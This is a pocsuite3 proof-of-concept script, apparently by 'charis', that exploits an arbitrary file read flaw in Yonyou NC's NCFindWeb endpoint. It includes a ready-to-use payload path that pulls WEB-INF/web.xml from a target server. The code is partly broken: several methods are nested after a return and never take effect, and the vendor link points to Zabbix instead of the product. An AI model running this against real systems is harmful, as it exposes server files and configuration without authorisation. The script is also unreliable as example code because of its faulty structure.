"""
作者 charis
时间 2023-1-16
"""
import time
import json
import re
from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, get_listener_ip, get_listener_port, VUL_TYPE
from pocsuite3.lib.core.enums import OS_ARCH, OS
from pocsuite3.lib.utils import random_str, generate_shellcode_list
from pocsuite3.modules.dnslog import Dnslog
from pocsuite3.modules.encryption import Encryption
from collections import OrderedDict
from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, VUL_TYPE
from pocsuite3.api import OptString


class DemoPOC(POCBase):
    vulID = '10'  # ssvid=
    version = '1.0'
    author = ['charis']
    vulDate = '未知'
    createDate = '2023-01-16'
    updateDate = '2023-01-16'
    references = ['https://github.com/linglong0523/--POC/blob/master/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E7%94%A8%E5%8F%8B%20NC%20NCFindWeb%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md']
    name = '用友 NC NCFindWeb 任意文件读取漏洞'
    appPowerLink = 'https://www.zabbix.com/'
    appName = '用友 NC'
    appVersion = '未知'
    vulType = VUL_TYPE.ARBITRARY_FILE_READ
    desc = ''''''
    samples = []
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    # 定义检查方法
    def _check(self, url):


        flag = "<?xml version"
        payloads = [
            r"/NCFindWeb?service=IPreAlertConfigService&filename=WEB-INF/web.xml"
        ]

        for payload in payloads:
            vul_url = url + payload

            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                "Accept-Encoding": "gzip, deflate",
                "Connection": "close",
                "Upgrade-Insecure-Requests": "1"
            }
            try:
                r = requests.get(vul_url, headers=headers)
                if r.status_code == 200:
                    if flag in r.text:
                        return url, payload, url + payload

            except requests.exceptions.RequestException as e:
                pass
        return False

    def _verify(self):

        result = {}
        p = self._check(self.url)
        if p:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = p[0]
            result['VerifyInfo']['payload'] = p[1]
            result['VerifyInfo']['Vulnerability-address'] = p[2]
        return self.parse_output(result)

        def _attack(self):
            exit("无需获取shell")

        def _shell(self):
            exit("无需获取shell")

        def parse_output(self, result):
            output = Output(self)
            if result:
                output.success(result)
            else:
                output.fail('target is not vulnerable')
            return output

register_poc(DemoPOC)


